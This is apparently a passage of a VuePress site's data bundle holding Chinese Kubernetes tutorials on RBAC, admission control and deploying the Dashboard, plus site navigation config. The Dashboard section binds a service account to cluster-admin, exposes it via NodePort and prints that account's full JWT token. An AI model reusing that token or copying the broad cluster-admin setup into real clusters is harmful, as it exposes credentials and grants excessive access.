resources：支持的资源对象列表\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbs：对资源对象的操作方法列表\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nrolebinding、clusterrolebinding\n角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是 user、group 或者 serviceaccount。\n\n# rolebinding可以将同一namespace中的subject绑定到某个role下，则此subject即具有该role定义的权限\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: authorization-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# clusterrolebinding在整个集群级别和所有namespaces将特定的subject与clusterrole绑定，授予权限\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nrolebinding 引用 clusterrole 进行授权\nrolebinding 可以引用 clusterrole，对属于同一命名空间内 clusterrole 定义的资源主体进行授权。\n\n> 一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（clusterrole），然后在多个命名空间中重复使用这些 clusterrole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。\n\n# 虽然authorization-clusterrole是一个集群角色，但是因为使用了rolebinding\n# 所以heima只能读取dev命名空间中的资源\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: user\n  name: heima\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: clusterrole\n  name: authorization-clusterrole\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n实战：创建一个只能管理 dev 空间下 pods 资源的账号\n1. 创建账号\n\n# 1) 创建证书\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) 用apiserver的证书去签署\n# 2-1) 签名申请，申请的用户是devman,组是devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/cn=devman/o=devgroup"     \n# 2-2) 签署证书\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -ca ca.crt -cakey ca.key -cacreateserial -out devman.crt -days 3650\n\n# 3) 设置集群、用户、上下文信息\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# 查看dev下pod，发现没有权限\n[root@k8s-master01 pki]# kubectl get pods -n dev\nerror from server (forbidden): pods is forbidden: user "devman" cannot list resource "pods" in api group "" in the namespace "dev"\n\n# 切换到admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. 创建 role 和 rolebinding，为 devman 用户授权\n\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: devman\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: dev-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. 切换账户，再次验证\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# 再次查看\n[root@k8s-master01 pki]# kubectl get pods -n dev\nname                                 ready   status             restarts   age\nnginx-deployment-66cb59b984-8wp2k    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     running            0          4d1h\n\n# 为了不影响后面的学习,切回admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 准入控制\n\n通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver 才会处理这个请求。\n\n准入控制是一个可配置的控制器列表，可以通过在 api-server 上通过命令行设置选择执行哪些准入控制器：\n\n--admission-control=namespacelifecycle,limitranger,serviceaccount,persistentvolumelabel,\n                      defaultstorageclass,resourcequota,defaulttolerationseconds\n\n\n1\n2\n\n\n只有当所有的准入控制器都检查通过之后，apiserver 才执行该请求，否则返回拒绝。\n\n当前可配置的 admission control 准入控制如下：\n\n * alwaysadmit：允许所有请求\n * alwaysdeny：禁止所有请求，一般用于测试\n * alwayspullimages：在启动容器之前总去下载镜像\n * denyexeconprivileged：它会拦截所有想在 privileged container 上执行命令的请求\n * imagepolicywebhook：这个插件将允许后端的一个 webhook 程序来完成 admission controller 的功能。\n * service account：实现 serviceaccount 实现了自动化\n * securitycontextdeny：这个插件将使用 securitycontext 的 pod 中的定义全部失效\n * resourcequota：用于资源配额管理目的，观察所有请求，确保在 namespace 上的配额不会超标\n * limitranger：用于资源限制管理，作用于 namespace 上，确保对 pod 进行资源限制\n * initialresources：为未设置资源请求与限制的 pod，根据其镜像的历史资源的使用情况进行设置\n * namespacelifecycle：如果尝试在一个不存在的 namespace 中创建资源对象，则该创建请求将被拒绝。当删除一个 namespace 时，系统将会删除该 namespace 中所有对象。\n * defaultstorageclass：为了实现共享存储的动态供应，为未指定 storageclass 或 pv 的 pvc 尝试匹配默认的 storageclass，尽可能减少用户在申请 pvc 时所需了解的后端存储细节\n * defaulttolerationseconds：这个插件为那些没有设置 forgiveness tolerations 并具有 notready:noexecute 和 unreachable:noexecute 两种 taints 的 pod 设置默认的 “容忍” 时间，为 5min\n * podsecuritypolicy：这个插件用于在创建或修改 pod 时决定是否根据 pod 的 security context 和可用的 podsecuritypolicy 对 pod 的安全策略进行控制',charsets:{cjk:!0}},{title:"kubernetes(十三) DashBoard",frontmatter:{title:"kubernetes(十三) DashBoard",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/612",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/612.kubernetes(%E5%8D%81%E4%B8%89)%20DashBoard.html",relativePath:"04.运维/60.Kubernetes/612.kubernetes(十三) DashBoard.md",key:"v-40ab9df5",path:"/kubernetes/612/",headers:[{level:2,title:"部署Dashboard",slug:"部署dashboard",normalizedTitle:"部署 dashboard",charIndex:172},{level:2,title:"使用DashBoard",slug:"使用dashboard",normalizedTitle:"使用 dashboard",charIndex:3508}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"部署Dashboard 使用DashBoard",content:"之前在 kubernetes 中完成的所有操作都是通过命令行工具 kubectl 完成的。其实，为了提供更丰富的用户体验，kubernetes 还开发了一个基于 web 的用户界面（Dashboard）。用户可以使用 Dashboard 部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理 kubernetes 中各种资源。\n\n\n# 部署 Dashboard\n\n1. 下载 yaml，并运行 Dashboard\n\n# 下载yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# 修改kubernetes-dashboard的Service类型\nkind: Service\napiVersion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: NodePort  # 新增\n  ports:\n    - port: 443\n      targetPort: 8443\n      nodePort: 30009  # 新增\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# 部署\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# 查看namespace下的kubernetes-dashboard下的资源\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nNAME                                            READY   STATUS    RESTARTS   AGE\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     Running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     Running   0          111s\n\nNAME                               TYPE       CLUSTER-IP      EXTERNAL-IP  PORT(S)         AGE\nservice/dashboard-metrics-scraper  ClusterIP  10.96.89.218    <none>       8000/TCP        111s\nservice/kubernetes-dashboard       NodePort   10.104.178.171  <none>       443:30009/TCP   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. 创建访问账户，获取 token\n\n# 创建账号\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# 授权\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# 获取账号token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nName:         dashboard-admin-token-xbqhh\nNamespace:    kubernetes-dashboard\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\nType:  kubernetes.io/service-account-token\n\nData\n====\nnamespace:  20 bytes\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. 通过浏览器访问 Dashboard 的 UI\n在登录页面上输入上面的 token\n\n\n\n出现下面的页面代表成功\n\n\n\n\n# 使用 DashBoard\n\n查看\n选择指定的命名空间 dev ，然后点击 Deployments ，查看 dev 空间下的所有 deployment\n\n\n\n扩缩容\n在 Deployment 上点击 规模 ，然后指定 目标副本数量 ，点击确定\n\n\n\n编辑\n在 Deployment 上点击 编辑 ，然后修改 yaml文件 ，点击确定\n\n\n\n查看 Pod\n点击 Pods , 查看 pods 列表\n\n\n\n操作 Pod\n选中某个 Pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作\n\n",normalizedContent:"之前在 kubernetes 中完成的所有操作都是通过命令行工具 kubectl 完成的。其实，为了提供更丰富的用户体验，kubernetes 还开发了一个基于 web 的用户界面（dashboard）。用户可以使用 dashboard 部署容器化的应用，还可以监控应用的状态，执行故障排查以及管理 kubernetes 中各种资源。\n\n\n# 部署 dashboard\n\n1. 下载 yaml，并运行 dashboard\n\n# 下载yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# 修改kubernetes-dashboard的service类型\nkind: service\napiversion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: nodeport  # 新增\n  ports:\n    - port: 443\n      targetport: 8443\n      nodeport: 30009  # 新增\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# 部署\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# 查看namespace下的kubernetes-dashboard下的资源\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nname                                            ready   status    restarts   age\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     running   0          111s\n\nname                               type       cluster-ip      external-ip  port(s)         age\nservice/dashboard-metrics-scraper  clusterip  10.96.89.218    <none>       8000/tcp        111s\nservice/kubernetes-dashboard       nodeport   10.104.178.171  <none>       443:30009/tcp   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. 创建访问账户，获取 token\n\n# 创建账号\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# 授权\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# 获取账号token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nname:         dashboard-admin-token-xbqhh\nnamespace:    kubernetes-dashboard\nlabels:       <none>\nannotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\ntype:  kubernetes.io/service-account-token\n\ndata\n====\nnamespace:  20 bytes\ntoken:      eyjhbgcioijsuzi1niisimtpzci6imjrykf4bw5xcdhwcmngugjtek5nodfusxl1awptmmu2m3o4lty5a2fks2cifq.eyjpc3mioijrdwjlcm5ldgvzl3nlcnzpy2vhy2nvdw50iiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9uyw1lc3bhy2uioijrdwjlcm5ldgvzlwrhc2hib2fyzcisimt1ymvybmv0zxmuaw8vc2vydmljzwfjy291bnqvc2vjcmv0lm5hbwuioijkyxnoym9hcmqtywrtaw4tdg9rzw4tegjxaggilcjrdwjlcm5ldgvzlmlvl3nlcnzpy2vhy2nvdw50l3nlcnzpy2utywnjb3vudc5uyw1lijoizgfzagjvyxjklwfkbwluiiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9zzxj2awnllwfjy291bnqudwlkijoiotvkodrkodatymu3ys00zdewlweyztatnjhmotaymjjkmdm5iiwic3viijoic3lzdgvtonnlcnzpy2vhy2nvdw50omt1ymvybmv0zxmtzgfzagjvyxjkomrhc2hib2fyzc1hzg1pbij9.nal7e8zfwwddopxkqzjztb46sk9e8iujynui9vnbay3jts7t1g1msjsbnbxzqsygag--cv0wyxjndzjy_uwcwagprqrt_gunxmok9aunzurqm55gr2rxiztjswvp2ebatsdghrmuubqvtfovdjb4x3nxcyln2opaamqg3rnu2rr-a8zcriux_eca12wip_qiup3sf-tzpdlpsyrfegtjzl6ynsgyavkc9id-cxzrb307qdcfxpfchr_2rt5fvfxargg_c0e3efhaayqo7citxsnioixpofnar8aurmopjyodqipqbwuehb7fhlu1dcduhniixvc_uicz-mkyewbdlw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. 通过浏览器访问 dashboard 的 ui\n在登录页面上输入上面的 token\n\n\n\n出现下面的页面代表成功\n\n\n\n\n# 使用 dashboard\n\n查看\n选择指定的命名空间 dev ，然后点击 deployments ，查看 dev 空间下的所有 deployment\n\n\n\n扩缩容\n在 deployment 上点击 规模 ，然后指定 目标副本数量 ，点击确定\n\n\n\n编辑\n在 deployment 上点击 编辑 ，然后修改 yaml文件 ，点击确定\n\n\n\n查看 pod\n点击 pods , 查看 pods 列表\n\n\n\n操作 pod\n选中某个 pod，可以对其执行日志（logs）、进入执行（exec）、编辑、删除操作\n\n",charsets:{cjk:!0}},{title:"Home",frontmatter:{home:!0,heroImage:"/assets/img/logo2.png",heroText:"人民万岁",tagline:"放下个人素质，享受缺德人生；拒绝精神内耗，有事直接发疯",bannerBg:"none",features:[{title:"甫光",details:"一个月才几百块，你玩什么命啊！！！"},{title:"向问天",details:"公道不在人心，是非在乎实力"},{title:"董天宝",details:"我命由我不由天"}],postList:"none",simplePostListLength:0,hideRightBar:!0},regularPath:"/",relativePath:"index.md",key:"v-59de6d20",path:"/",headers:[{level:2,title:"架构",slug:"架构",normalizedTitle:"架构",charIndex:2},{level:2,title:"鼓励",slug:"鼓励",normalizedTitle:"鼓励",charIndex:9}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"架构 鼓励",content:"# 架构\n\n\n# 鼓励\n\n世界是你们的，也是我们的，但是归根结底是你们的。你们青年人朝气蓬勃，正在兴旺时期，好像早晨八九点钟的太阳。希望寄托在你们身上。—— 毛泽东",normalizedContent:"# 架构\n\n\n# 鼓励\n\n世界是你们的，也是我们的，但是归根结底是你们的。你们青年人朝气蓬勃，正在兴旺时期，好像早晨八九点钟的太阳。希望寄托在你们身上。—— 毛泽东",charsets:{cjk:!0}}],themeConfig:{nav:[{text:"首页",link:"/"},{text:"语言",items:[{text:"JAVA",link:"/language/java/base/1/"},{text:"仓颉",link:"/language/cj/1/"},{text:"设计模式",link:"/language/mode/1/"}]},{text:"框架",items:[{text:"Spring",link:"/spring/spring/200/"},{text:"Mybatis",link:"/mybatis/mybatis/300/"},{text:"Maven",link:"/maven/2300/"}]},{text:"中间件",items:[{text:"Kafka",link:"/kafka/1400/"},{text:"RabbitMQ",link:"/rabbitmq/1500/"},{text:"Redis",link:"/redis/1600/"},{text:"Nginx",link:"/nginx/1/"},{text:"Elasticsearch",link:"/es/1800/"}]},{text:"大数据",items:[{text:"Hadoop",link:"/hadoop/700/"},{text:"ClickHouse",link:"/clickhouse/800/"},{text:"Hbase",link:"/hbase/900/"},{text:"Hive",link:"/hive/1000/"},{text:"Flume",link:"/flume/1100/"},{text:"Flink",link:"/flink/1200/"},{text:"MySQL",link:"/mysql/1300/"},{text:"MongoDB",link:"/mongodb/1800/"}]},{text:"前端",items:[{text:"VUE3",link:"/vue3/1900/"},{text:"微信小程序",link:"/wx/2000/"}]},{text:"运维",items:[{text:"linux",link:"/linux/2300/"},{text:"Docker",link:"/docker/400/"},{text:"Jenkins",link:"/jenkins/500/"},{text:"Kubernetes",link:"/kubernetes/600/"}]}],sidebarDepth:2,logo:"/assets/img/logo1.png",repo:"landashu?tab=repositories",searchMaxSuggestions:10,lastUpdated:"上次更新",docsDir:"docs",editLinks:!1,editLinkText:"编辑",pageStyle:"line",defaultMode:"auto",category:!1,tag:!1,archive:!1,rightMenuBar:!0,sidebarOpen:!0,sidebar:{"/00.语言/":[{title:"JAVA",collapsable:!1,children:[{title:"基础",collapsable:!1,children:[["01.JAVA/01.基础/1.JAVA 锁 及 线程.md","JAVA 锁 及 线程","/language/java/base/1/"],["01.JAVA/01.基础/2.JAVA NIO API.md","JAVA NIO API","/language/java/base/2/"]]},{title:"JVM",collapsable:!1,children:[["01.JAVA/02.JVM/1.JVM模块介绍.md","JVM 模块介绍","/language/java/jvm/1/"]]},{title:"版本",collapsable:!1,children:[["01.JAVA/03.版本/1.JAVA8 新特性总结.md","JAVA8 新特性总结","/language/java/version/1/"],["01.JAVA/03.版本/2.JAVA9 新特性总结.md","JAVA9 新特性总结","/language/java/version/2/"],["01.JAVA/03.版本/3.JAVA 10-17 新特性总结.md","JAVA 10/11/12/13/14/15/16/17 新特性总结","/language/java/version/3/"]]},{title:"其他",collapsable:!1,children:[["01.JAVA/04.其他/1.打包exe程序.md","jar 打包成.exe可执行文件","/language/java/other/1/"],["01.JAVA/04.其他/2.java代码混淆之ProGuard.md","java代码混淆之 ProGuard","/language/java/other/2/"],["01.JAVA/04.其他/3.JAVA 性能监控（jvisualvm）及测试（JMeter）.md","JAVA 性能监控（jvisualvm）及测试（JMeter）","/language/java/other/3/"],["01.JAVA/04.其他/4.Alibaba Arthas.md","Alibaba Arthas","/language/java/other/4/"],["01.JAVA/04.其他/5.jar启动脚本.md","jar启动脚本","/language/java/other/5/"]]}]},{title:"仓颉",collapsable:!1,children:[{title:"基础",collapsable:!1,children:[["02.仓颉/01.基础/1.仓颉.md","JVM 模块介绍","/language/cj/1/"]]}]},{title:"设计模式",collapsable:!1,children:[["03.设计模式/1.设计模式.md","代理模式","/language/mode/1/"]]}],catalogue:{},"/01.框架/":[{title:"Spring",collapsable:!1,children:[{title:"spring",collapsable:!1,children:[["01.Spring/01.spring/200.核心内容拆解 IOC.md","核心内容拆解 IOC","/spring/spring/200/"],["01.Spring/01.spring/201.核心内容拆解 AOP.md","核心内容拆解 AOP","/spring/spring/201/"],["01.Spring/01.spring/202.核心内容拆解 事件通知.md","核心内容拆解 事件通知","/spring/spring/202/"],["01.Spring/01.spring/203.核心内容拆解 三级缓存.md","核心内容拆解 三级缓存","/spring/spring/203/"],["01.Spring/01.spring/204.核心内容拆解 FactoryBean.md","核心内容拆解 FactoryBean","/spring/spring/204/"],["01.Spring/01.spring/205.注解替代Spring生命周期实现类.md","注解替代Spring生命周期实现类","/spring/spring/205/"]]},{title:"spring mv",collapsable:!1,children:[["01.Spring/02.spring mv/200.Spring MVC 之工作原理.md","Spring MVC 之基本工作原理","/spring/spring-mvc/200/"]]},{title:"spring boot",collapsable:!1,children:[["01.Spring/03.spring boot/200.SpringBoot 之 Filter、Interceptor、Aspect.md","SpringBoot 之 Filter、Interceptor、Aspect","/spring/spring-boot/200/"],["01.Spring/03.spring boot/201.SpringBoot 之 Starter.md","SpringBoot 之 Starter","/spring/spring-boot/201/"],["01.Spring/03.spring boot/202.SpringBoot 之 Stomp 使用和 vue 相配置.md","SpringBoot 之 Stomp 使用和 vue 相配置","/spring/spring-boot/202/"],["01.Spring/03.spring boot/203.SpringBoot MyBatisPlus 实现多数据源.md","SpringBoot MyBatisPlus 实现多数据源","/spring/spring-boot/203/"],["01.Spring/03.spring boot/204.SpringBoot MyBatis 动态建表.md","SpringBoot MyBatis 动态建表","/spring/spring-boot/204/"],["01.Spring/03.spring boot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.md","Spring Boot 集成 Jasypt 3.0.3 配置文件加密","/spring/spring-boot/205/"],["01.Spring/03.spring boot/206.Spring Boot 集成 FastDFS.md","Spring Boot 集成 FastDFS","/spring/spring-boot/206/"],["01.Spring/03.spring boot/207.Spring Boot VUE前后端加解密.md","Spring Boot VUE前后端加解密","/spring/spring-boot/207/"]]},{title:"spring cloud",collapsable:!1,children:[["01.Spring/04.spring cloud/1.SpringCloud 之 Ribbon和Feign.md","SpringCloud 之 Ribbon和Feign","/spring/spring-cloud/1/"],["01.Spring/04.spring cloud/2.SpringCloud alibaba - Nacos.md","SpringCloud alibaba - Nacos","/spring/spring-cloud/2/"]]}]},{title:"Mybatis",collapsable:!1,children:[{title:"mybatis",collapsable:!1,children:[["02.Mybatis/31.mybatis/300.核心功能拆解 工作流程.md","核心功能拆解 工作流程","/mybatis/mybatis/300/"],["02.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.md","核心功能拆解 Plugin插件功能实现","/mybatis/mybatis/301/"],["02.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.md","核心功能拆解 一二级缓存原理","/mybatis/mybatis/302/"],["02.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.md","MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存","/mybatis/mybatis/303/"]]}]},{title:"maven",collapsable:!1,children:[["03.maven/2300.pom 文件介绍及 parent、properties 标签详解.md","pom 文件介绍及 parent、properties 标签详解","/maven/2300/"],["03.maven/2301.dependencies 标签详解.md","dependencies 标签详解","/maven/2301/"],["03.maven/2302.使用 Nexus3.x 搭建私服.md","使用 Nexus3.x 搭建私服","/maven/2302/"]]}],"/02.中间件/":[{title:"kafka",collapsable:!1,children:[["01.kafka/1400.kafka-2.7.0 基本概念.md","kafka-2.7.0 基本概念","/kafka/1400"],["01.kafka/1401.Kafka-2.7.0 搭建及参数解析.md","Kafka-2.7.0 搭建及参数解析","/kafka/1401"],["01.kafka/1402.kafka-2.7.0 spring boot 集成 kafka.md","kafka-2.7.0 spring boot 集成 kafka","/kafka/1402"],["01.kafka/1403.kafka-2.7.0 kafka Connect.md","kafka-2.7.0 kafka Connect","/kafka/1403"],["01.kafka/1404.kafka-2.7.0 Kafka Streams 流处理.md","kafka-2.7.0 Kafka Streams 流处理","/kafka/1404"]]},{title:"redis",collapsable:!1,children:[["03.redis/1600.Redis介绍.md","Redis 介绍","/redis/1600"],["03.redis/1601.Redis命令介绍.md","Redis命令介绍","/redis/1601"],["03.redis/1602.Redis分布式锁介绍.md","Redis分布式锁介绍","/redis/1602"],["03.redis/1603.Redis事务介绍.md","Redis事务介绍","/Redis/1603"],["03.redis/1604.Redis的key失效通知介绍.md","Redis的key失效通知介绍","/Redis/1604"],["03.redis/1605.Redis配置文件解读.md","Redis配置文件解读","/Redis/1605"],["03.redis/1606.Redis记一次宕机排查.md","Redis记一次宕机排查","/Redis/1606"],["03.redis/1607.Redis高可用(一) 主从理论.md","Redis高可用(一) 主从理论","/Redis/1607"],["03.redis/1608.Redis高可用(二) 哨兵理论.md","Redis高可用(二) 哨兵理论","/Redis/1608"],["03.redis/1609.Redis高可用(三) 搭建.md","Redis高可用(三) 搭建","/Redis/1609"]]},{title:"nginx",collapsable:!1,children:[["04.nginx/1700.Nginx 基本概念及介绍.md","Nginx 基本概念及介绍","/nginx/1"]]},{title:"Elasticsearch",collapsable:!1,children:[["05.Elasticsearch/1800.ES 7.8.0（一） 入门介绍.md","ES 7.8.0（一） 入门介绍","/es/1800"],["05.Elasticsearch/1801.ES 7.8.0（二） 读、写和写索引流程以及文档分析过程.md","ES 7.8.0（二） 读、写和写索引流程以及文档分析过程","/es/1801"],["05.Elasticsearch/1802.ES 7.8.0（三） 文档冲突.md","ES 7.8.0（三） 文档冲突","/es/1802"]]}],"/03.大数据/":[{title:"mysql",collapsable:!1,children:[["04.mysql/1300.MySQL 索引介绍.md","MySQL 索引介绍","/mysql/1300"],["04.mysql/1301.MySQL 锁介绍.md","MySQL 锁介绍","/mysql/1301"],["04.mysql/1302.MySQL 索引优化工具 explain.md","MySQL 索引优化工具 explain","/mysql/1302"]]},{title:"mongodb",collapsable:!1,children:[["05.mongodb/1800.mongodb.md","mongodb","/mongodb/1800/"]]}],"/04.运维/":[{title:"Docker",collapsable:!1,children:[["40.Docker/400.Docker 概念、命令及Dockerfile介绍.md","Docker 概念、命令及Dockerfile介绍","/docker/400"],["40.Docker/401.Docker-Compose 命令及基本使用.md","Docker-Compose 